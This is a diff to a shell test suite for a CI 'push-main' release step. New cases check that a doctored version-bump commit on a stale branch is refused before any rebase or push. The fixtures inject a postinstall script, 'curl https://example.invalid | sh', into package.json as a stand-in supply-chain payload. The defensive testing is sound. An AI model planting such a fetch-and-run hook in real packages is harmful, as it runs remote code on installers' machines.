@@ -21,8 +21,9 @@
 # the re-run cases, b plays a later attempt of a's run or of an older run; in
 # the refusal cases, b's HEAD carries a branch commit beside the bump, a bump
 # that changes a second file, a manifest-only commit that changes more than the
-# version, or a merge commit over main's tip — or is a root commit with no
-# parent — each of which push-main refuses before any push. A
+# version (on main's tip, or on an older main commit, before any rebase), or a
+# merge commit over main's tip — or is a root commit with no parent — each of
+# which push-main refuses before any push. A
 # pre-receive hook that always rejects forces the exhaustion case. push-main
 # reaches origin as push-tag does: through the deploy key, with the GitHub URL
 # rewritten to the local origin by GIT_CONFIG_*, so the key directory is all
@@ -234,9 +235,9 @@ git -C "$work/c2c/b" add packages/pkg/package.json
 git -C "$work/c2c/b" commit -q -m "feat: a release the author bumped"
 push_main "$work/c2c/b" 1.0.1 "$work/c2c/summary.md"
 check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "error says the manifest differs in more than the version" "$(contains "$out" "^::error::HEAD's packages/pkg/package\.json differs from main's in more than \.version = 1\.0\.1\. push-main pushes the one version-bump commit")"
+check "error says the manifest differs from its parent's in more than the version" "$(contains "$out" "^::error::HEAD's packages/pkg/package\.json differs from its parent's in more than \.version = 1\.0\.1\. push-main pushes the one version-bump commit")"
 check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
-check "job summary says the same" "$(contains "$(cat "$work/c2c/summary.md" 2>/dev/null)" "differs from main's in more than \.version = 1\.0\.1.*The release itself succeeded.*only this version-bump push to main is outstanding")"
+check "job summary says the same" "$(contains "$(cat "$work/c2c/summary.md" 2>/dev/null)" "differs from its parent's in more than \.version = 1\.0\.1.*The release itself succeeded.*only this version-bump push to main is outstanding")"
 check "the output never shows the manifest's content" "$(is "$(contains "$out" 'example\.invalid\|postinstall')" false)"
 check "nothing was pushed" "$(is "$seen" "")"
 check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2c")" 1.0.0)"
@@ -311,6 +312,55 @@ check "job summary says the same" "$(contains "$(cat "$work/c2f/summary.md" 2>/d
 check "nothing was pushed" "$(is "$seen" "")"
 check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2f")" 1.0.0)"
 check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2f")" seed)"
+
+echo
+echo "Case 2g: the doctored manifest-only commit of 2c on a stale branch is refused before any rebase"
+# main moved on after the checkout, so the commit's parent is an older main
+# commit. The content checks run against that parent before the rebase that
+# would carry the commit onto main's tip, so it is refused where it stands.
+setup "$work/c2g"
+change "$work/c2g/a" src/guard.js "feat: guard"
+git -C "$work/c2g/a" push -q origin main
+record_hook "$work/c2g/origin.git"
+tip=$(git -C "$work/c2g/origin.git" rev-parse main)
+seed=$(git -C "$work/c2g/b" rev-parse HEAD)
+jq '.version = "1.0.1" | .scripts.postinstall = "curl https://example.invalid | sh"' "$work/c2g/b/packages/pkg/package.json" > "$work/c2g/b/tmp.json" \
+  && mv "$work/c2g/b/tmp.json" "$work/c2g/b/packages/pkg/package.json"
+git -C "$work/c2g/b" add packages/pkg/package.json
+git -C "$work/c2g/b" commit -q -m "feat: a release the author bumped"
+check "the commit's parent is the seed, which main has moved past" "$([ "$(git -C "$work/c2g/b" rev-parse HEAD^)" = "$seed" ] && [ "$seed" != "$tip" ] && echo true || echo false)"
+push_main "$work/c2g/b" 1.0.1 "$work/c2g/summary.md"
+check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
+check "error says the manifest differs from its parent's in more than the version" "$(contains "$out" "^::error::HEAD's packages/pkg/package\.json differs from its parent's in more than \.version = 1\.0\.1\. push-main pushes the one version-bump commit")"
+check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
+check "job summary says the same" "$(contains "$(cat "$work/c2g/summary.md" 2>/dev/null)" "differs from its parent's in more than \.version = 1\.0\.1.*The release itself succeeded.*only this version-bump push to main is outstanding")"
+check "the output never shows the manifest's content" "$(is "$(contains "$out" 'example\.invalid\|postinstall')" false)"
+check "no rebase was started" "$(not_rebasing "$work/c2g/b")"
+check "HEAD still sits on the seed, not rebased onto main's tip" "$(is "$(git -C "$work/c2g/b" rev-parse HEAD^)" "$seed")"
+check "nothing was pushed" "$(is "$seen" "")"
+check "origin/main's tip is still main's own" "$(is "$(git -C "$work/c2g/origin.git" rev-parse main)" "$tip")"
+check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2g")" 1.0.0)"
+
+# The same commit when main already holds the version: the rebase path would
+# drop it whole with the superseded-version notice, so the checks must refuse
+# it before that exit.
+setup "$work/c2g-held"
+bump "$work/c2g-held/a" 1.0.1
+git -C "$work/c2g-held/a" push -q origin main
+record_hook "$work/c2g-held/origin.git"
+tip=$(git -C "$work/c2g-held/origin.git" rev-parse main)
+jq '.version = "1.0.1" | .scripts.postinstall = "curl https://example.invalid | sh"' "$work/c2g-held/b/packages/pkg/package.json" > "$work/c2g-held/b/tmp.json" \
+  && mv "$work/c2g-held/b/tmp.json" "$work/c2g-held/b/packages/pkg/package.json"
+git -C "$work/c2g-held/b" add packages/pkg/package.json
+git -C "$work/c2g-held/b" commit -q -m "feat: a release the author bumped"
+push_main "$work/c2g-held/b" 1.0.1 "$work/c2g-held/summary.md"
+check "main already at the version: push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
+check "main already at the version: error says the manifest differs from its parent's" "$(contains "$out" "^::error::HEAD's packages/pkg/package\.json differs from its parent's in more than \.version = 1\.0\.1\.")"
+check "main already at the version: no superseded-version notice, the commit is refused, not dropped" "$(is "$(contains "$out" '::notice title=Version bump not pushed')" false)"
+check "main already at the version: the output never shows the manifest's content" "$(is "$(contains "$out" 'example\.invalid\|postinstall')" false)"
+check "main already at the version: no rebase was started" "$(not_rebasing "$work/c2g-held/b")"
+check "main already at the version: nothing was pushed" "$(is "$seen" "")"
+check "main already at the version: origin/main's tip is still a's bump" "$(is "$(git -C "$work/c2g-held/origin.git" rev-parse main)" "$tip")"
 
 echo
 echo "Case 3: five rejections fail, saying the release succeeded and only the push is outstanding"
